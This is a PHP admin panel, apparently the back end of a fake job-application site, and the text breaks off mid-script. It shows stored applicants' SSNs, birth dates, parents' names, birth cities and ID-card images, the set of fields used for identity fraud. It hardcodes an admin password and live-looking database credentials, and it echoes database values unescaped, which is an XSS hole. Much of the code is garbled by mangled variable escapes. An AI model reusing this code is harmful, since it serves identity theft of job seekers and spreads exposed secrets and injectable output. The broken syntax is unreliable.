<?php
session_start();

// SIMPLE LOGIN
\$admin_user = "admin";
\$admin_pass = "ijobapizzle1";

if (!isset(\$_SESSION['logged_in'])) {
    if (isset(\(_POST['username']) && isset(\)_POST['password'])) {
        if (\$_POST['username'] === \(admin_user &&\)_POST['password'] === \(admin_pass) {\)_SESSION['logged_in'] = true;
            header("Location: admin.php");
            exit;
        } else {
            \$error = "Invalid login";
        }
    }
    echo '
    <form method="POST" style="max-width:300px;margin:100px auto;text-align:center;">
        <h2>Admin Login</h2>
        <input name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px;"><br>
        <input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px;"><br>
        <button style="padding:10px 20px;">Login</button>
        <p style="color:red;">'.(\$error ?? "").'</p>
    </form>';
    exit;
}

// ======================
// DATABASE CONNECTION
// ======================
\$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
\$db   = "neondb";
\$user = "neondb_owner";
\$pass = "npg_TQ1gBOwA9rCa";
\$port = "5432";

\(dsn = "pgsql:host=\)host;port=\(port;dbname=\)db;sslmode=require";

try {
    \(pdo = new PDO(\)dsn, \(user,\)pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception \$e) {
    die("Database connection failed: " . \$e->getMessage());
}

// ======================
// HANDLE BULK / SINGLE DELETE REQUEST
// ======================
if (\(_SERVER['REQUEST_METHOD'] === 'POST' && isset(\)_POST['action']) && \(_POST['action'] === 'delete') {\)ids_to_delete = [];
    
    if (isset(\(_POST['bulk_ids']) && is_array(\)_POST['bulk_ids'])) {
        \(ids_to_delete = array_filter(\)_POST['bulk_ids'], 'is_numeric');
    } elseif (isset(\(_POST['id']) && !empty(\)_POST['id'])) {
        \(ids_to_delete[] = filter_var(\)_POST['id'], FILTER_VALIDATE_INT);
    }
    
    if (!empty(\$ids_to_delete)) {
        try {
            \(placeholders = implode(',', array_fill(0, count(\)ids_to_delete), '?'));
            \(delete_stmt =\)pdo->prepare("DELETE FROM job_applications WHERE id IN (\$placeholders)");
            \(delete_stmt->execute(array_values(\)ids_to_delete));
            
            header("Location: admin.php");
            exit;
        } catch (Exception \(e) {\)delete_error = "Failed to complete deletion process: " . \$e->getMessage();
        }
    }
}

// ======================
// FETCH DATA
// ======================
\(stmt =\)pdo->query("SELECT * FROM job_applications ORDER BY id DESC");
\(data =\)stmt->fetchAll(PDO::FETCH_ASSOC);

// ======================
// UI STYLE INJECTIONS & MODAL SCRIPT
// ======================
echo "
<style>
    body { font-family: Arial, sans-serif; background-color: #f8fafc; color: #334155; margin: 0; padding: 20px; }
    .admin-container { max-width: 1000px; margin: auto; }
    .bulk-bar { background: white; padding: 15px 20px; border-radius: 12px; border: 1px solid #e2e8f0; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.02); position: -webkit-sticky; position: sticky; top: 10px; z-index: 100; }
    .app-card { border: 1px solid #e2e8f0; padding: 20px 20px 20px 50px; margin: 15px auto; border-radius: 12px; background: white; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); position: relative; }
    .card-checkbox { position: absolute; left: 20px; top: 24px; transform: scale(1.4); cursor: pointer; }
    .btn-view { background: #3b82f6; color: white; padding: 6px 12px; border-radius: 6px; text-decoration: none; font-size: 14px; cursor: pointer; display: inline-block; border: none; margin-right: 5px; }
    .btn-download { background: #10b981; color: white; padding: 6px 12px; border-radius: 6px; text-decoration: none; font-size: 14px; display: inline-block; }
    .btn-delete { background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; border: none; font-size: 14px; cursor: pointer; font-weight: bold; }
    .btn-delete:hover { background: #dc2626; }
    #imageModal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.85); align-items: center; justify-content: center; }
    #modalImg { max-width: 90%; max-height: 85%; border-radius: 8px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
    .close-modal { position: absolute; top: 20px; right: 30px; color: white; font-size: 40px; font-weight: bold; cursor: pointer; }
</style>

<div class='admin-container'>
<h1 style='text-align:center; color: #1e293b; margin-bottom: 25px;'>Job Applications Management</h1>";

if (isset(\$delete_error)) {
    echo "<p style='color:red; text-align:center;'><strong>Error: \$delete_error</strong></p>";
}

echo "<form id='mainForm' method='POST' onsubmit='return confirmAction(this);'>";
echo "<input type='hidden' name='action' value='delete' id='formAction'>";
echo "<input type='hidden' name='id' value='' id='singleDeleteId'>";

echo "
<div class='bulk-bar'>
    <label style='font-weight: bold; cursor:pointer; display:flex; align-items:center; gap:8px;'>
        <input type='checkbox' id='selectAll' style='transform: scale(1.2); cursor:pointer;'> Select All Applications
    </label>
    <button type='submit' class='btn-delete' onclick='setBulkAction()'>🗑 Delete Selected</button>
</div>";

foreach (\(data as\)row) {
    \(safe_name = preg_replace('/[^a-zA-Z0-9]/', '_',\)row['first_name'] . '_' . \(row['last_name']);\)submission_date = "N/A";
    if (!empty(\$row['created_at'])) {
        \(submission_date = date("M d, Y, h:i A", strtotime(\)row['created_at']));
    }
    
    echo "
    <div class='app-card'>
        <input type='checkbox' name='bulk_ids[]' value='{\$row['id']}' class='card-checkbox client-box'>
        
        <h3 style='color: #1e293b; margin-top: 0; border-bottom: 2px solid #f1f5f9; padding-bottom: 8px;'>
            👤 {\$row['first_name']} {\(row['middle_name']} {\)row['last_name']}
        </h3>
        <p style='color: #64748b; font-size: 14px; margin-top: -5px; margin-bottom: 15px;'><strong>📅 SUBMITTED ON:</strong> {\$submission_date}</p>
        
        <p><strong>🧾 SSN:</strong> {\$row['ssn']}</p>
        <p><strong>📞 PHONE:</strong> {\$row['phone']}</p>
        <p><strong>📧 EMAIL:</strong> {\$row['email']}</p>
        <p><strong>🎂 DOB:</strong> {\$row['dob']}</p>
        <p><strong>🏠 ADDRESS:</strong> {\$row['address']}</p>
        <p><strong>🏙 BIRTH CITY:</strong> {\$row['birth_city']}</p>
        <p><strong>👨 FATHER NAME:</strong> {\$row['father_name']}</p>
        <p><strong>👩 MOTHER NAME:</strong> {\$row['mother_name']}</p>
        
        <div style='margin-top: 15px; padding-top: 15px; border-top: 1px dashed #e2e8f0; display: flex; justify-content: space-between; align-items: center;'>
            <div>
                <p style='margin: 8px 0;'>
                    <strong>🪪 Front ID:</strong> 
                    " . (!empty(\$row['front_id']) ? "
                        <button type='button' class='btn-view' onclick='openImageModal(`" . $row['front_id'] . "`)'>View Image</button>
                        <a href='{\(row['front_id']}' download='{\)safe_name}_front_id.png' class='btn-download'>Download</a>
                    " : "<span style='color: #ef4444;'>No image provided</span>") . "
                </p>

                <p style='margin: 8px 0;'>
                    <strong>🪪 Back ID:</strong> 
                    " . (!empty(\$row['back_id']) ? "
                        <button type='button' class='btn-view' onclick='openImageModal(`" . $row['back_id'] . "`)'>View Image</button>
                        <a href='{\(row['back_id']}' download='{\)safe_name}_back_id.png' class='btn-download'>Download</a>
                    " : "<span style='color: #ef4444;'>No image provided</span>") . "
                </p>
            </div>
            
            <div>
                <button type='submit' class='btn-delete' onclick='setSingleAction({\$row['id']})'>🗑 Delete Record</button>
            </div>
        </div>
    </div>";
}

echo "</form>";
echo "</div>";

echo '
<div id="imageModal" onclick="this.style.display=\'none\'">
    <span class="close-modal" onclick="document.getElementById(\'imageModal\').style.display=\'none\'">&times;</span>
    <img id="modalImg" src="" alt="Enlarged view">
</div>

<script>
var isBulkSubmit = false;

document.getElementById("selectAll").addEventListener("change", function() {
    var checkBoxes = document.getElementsByClassName("client-box");
    for (var i = 0; i < checkBoxes.length; i++) {
        checkBoxes[i].checked = this.checked;
    }
});

function setBulkAction() {
    isBulkSubmit = true;
    document.getElementById("singleDeleteId").value = "";
}

function setSingleAction(id) {
    isBulkSubmit = false;
    document.getElementById("singleDeleteId").value = id;
}

function confirmAction(form) {
    if (isBulkSubmit) {
        var checkedCount = 0;
        var checkBoxes = document.getElementsByClassName("client-box");
        for (var i = 0; i < checkBoxes.length; i++) {
            if(checkBoxes[i].checked) checkedCount++;
        }
        
        if (checkedCount === 0) {
            alert("Please select at least one application record checkbox to proceed.");
            return false;
        }
        return confirm("Are you sure you want to bulk delete " + checkedCount + " selected applications? This action is permanent and clears Neon database space.");
    } else {
        return confirm("Are you sure you want to permanently delete this single applicant record from Neon database storage?");
    }
}

function openImageModal(base64Data) {
    if(!base64Data || base64Data.trim() === "") {
        alert("No valid image data available.");
        return;
    }
    var modal = document.getElementById("imageModal");
    var modalImg = document.getElementById("modalImg");
    modalImg.src = base64Data;
